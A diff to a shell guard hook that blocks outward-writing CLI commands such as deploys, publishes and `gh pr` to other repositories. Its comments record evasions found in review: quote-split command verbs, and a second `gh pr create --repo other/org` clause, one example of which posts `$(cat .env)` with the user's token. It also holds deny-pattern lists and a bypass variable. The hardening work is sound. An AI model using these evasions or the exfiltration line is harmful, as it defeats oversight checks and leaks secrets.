@@ -221,12 +221,16 @@ _OUT_REPO_FLAG_RE='(^|[^-A-Za-z0-9])(--repo([^-A-Za-z0-9]|$)|-R)'
 # before it shipped). lib/cmd-detect.sh:242, the precedent this check follows,
 # is likewise clause-scoped: it applies the identical regex to `$full_match`,
 # never to the whole command.
-# The caller has already established from $BARE that a COMMAND-POSITION
-# `gh pr <sub>` exists, so this raw, unanchored extraction only decides WHICH
-# text to search. `head -1` inherits the same first-occurrence residual as the
-# other multi-occurrence sites here (a quoted MENTION preceding a real
-# invocation is searched instead) — deny direction, and the ambiguous-multi
-# case is already denied outright for `merge`.
+# The caller has already established from $WORDS that a COMMAND-POSITION
+# `gh pr <sub>` exists AND that there is EXACTLY ONE such occurrence — every
+# call site denies outright on >1 occurrence before ever reaching this
+# function (see GH_PR_MERGE_OCCURRENCES above and GH_PR_CREATE_OCCURRENCES
+# below), so `head -1` here only ever sees the single real clause, never
+# chooses among several. This was NOT always true for create/comment: an
+# earlier revision counted occurrences for merge/api only, leaving `head -1`
+# free to silently inspect a benign FIRST create/comment clause while a
+# malicious `--repo` clause sat unexamined in a second one — unbounded PAT
+# egress (review round 4, 2026-08-17).
 # Cuts from $WORDS so the clause is found for the SAME spellings the detector
 # above matches. Left on raw $CMD it silently returned an empty clause — and
 # therefore ALLOWED — for `gh pr "create" --repo other/org`, unbounded PAT egress
@@ -265,6 +269,15 @@ gh_pr_clause_has_repo() {
 crude_smells_outward() {
   local t=${1//$'\n'/ }
   t=${t//\\n/ }
+  # Strip quote/backslash/$ characters (review round 4, 2026-08-17): this is a
+  # non-quote-aware smell test by design, but leaving these characters in
+  # place let a $-sigil-split verb (`e$'a's update`, which cmd_words itself
+  # reconstructs to `eas update`) hide from every regex below, all of which
+  # require the verb's letters adjacent. Stripping only ever REMOVES
+  # punctuation, never letters, so it can only make this fail-closed check
+  # fire MORE often, never less — the safe direction for a fallback that only
+  # runs when everything else (jq, awk, or the lib itself) is already broken.
+  t=${t//\'/}; t=${t//\"/}; t=${t//\\/}; t=${t//\$/}
   # Command-word patterns — case-INSENSITIVE (macOS APFS resolves `EAS`).
   grep -Eqi 'eas[^a-zA-Z]+(update|publish|submit)|eas[^a-zA-Z]+update:(delete|edit|republish|revert-update-rollout|roll-back-to-embedded|rollback)|eas[^a-zA-Z]+(channel|branch):(create|edit|delete|rename)|eas[^a-zA-Z]+build[^;&|]*--auto-submit|railway[^a-zA-Z]+(up|deploy|redeploy|restart|down|delete|remove|rm|run)|railway[^a-zA-Z]+(variable|variables|vars|var)[^a-zA-Z]+(set|delete)|railway[^a-zA-Z]+(service|environment)[^a-zA-Z]+delete|npm[^a-zA-Z]+publish|(npm|pnpm|yarn)([^a-zA-Z]+-{1,2}[^[:space:]]*)*[^a-zA-Z]+(run-script|run)([^a-zA-Z]+-{1,2}[^[:space:]]*)*[^a-zA-Z]+update:(preview|production)|(yarn|pnpm)([^a-zA-Z]+-{1,2}[^[:space:]]*)*[^a-zA-Z]+update:(preview|production)|gh[^a-zA-Z]+pr[^a-zA-Z]+(merge|close|edit|ready|reopen|review|lock|unlock|update-branch|revert)|gh[^a-zA-Z]+release[^a-zA-Z]+(create|delete|delete-asset|edit|upload)|gh[^a-zA-Z]+repo[^a-zA-Z]+(create|delete|archive|unarchive|edit|rename|sync|fork)|gh[^a-zA-Z]+api[^a-zA-Z]' <<< "$t" && return 0
   # Flag-correlated patterns — case-SENSITIVE (a case-insensitive `-R` would
@@ -621,8 +634,19 @@ fi
 # other/org --body "$(cat .env)"` was ALLOWED, review round 3). Same treatment
 # lib/cmd-detect.sh:242 already gives the flag, and this repo's own PR flow
 # never passes it. Clause-scoped raw-$CMD flag scan — see gh_pr_clause_has_repo.
-if grep -Eqi "${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+(create|comment)${_OUT_POS_SUFFIX}" <<< "$WORDS" \
-   && gh_pr_clause_has_repo 'create|comment'; then
+#
+# COUNTED, matching the gh pr merge treatment above (review round 4,
+# 2026-08-17): gh_pr_clause_has_repo's `head -1` only ever inspects the FIRST
+# create/comment clause, and unlike `merge` this family had no occurrence-
+# count backstop of its own — a benign first clause let a malicious second
+# clause's --repo/-R sail through unexamined (`gh pr create --fill && gh pr
+# create --repo other/org --title x` was ALLOWED). Deny outright on >1
+# occurrence rather than guess which clause to inspect.
+GH_PR_CREATE_RE="${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+(create|comment)${_OUT_POS_SUFFIX}"
+GH_PR_CREATE_OCCURRENCES=$(printf '%s' "$WORDS" | grep -oiE "$GH_PR_CREATE_RE" | wc -l | tr -d '[:space:]')
+if [ "${GH_PR_CREATE_OCCURRENCES:-0}" -gt 1 ]; then
+  deny "guard-outward-cli: more than one command-position 'gh pr create/comment' occurrence — ambiguous, cannot verify each is free of --repo/-R. Denying is the safe direction for a deny gate. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
+elif [ "${GH_PR_CREATE_OCCURRENCES:-0}" -eq 1 ] && gh_pr_clause_has_repo 'create|comment'; then
   deny "guard-outward-cli: 'gh pr create/comment' with --repo/-R writes to a DIFFERENT GitHub repository with the user's PAT — unbounded egress, outside the routine-workflow carve-out these two subcommands get. Without --repo/-R they stay allowed. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
 
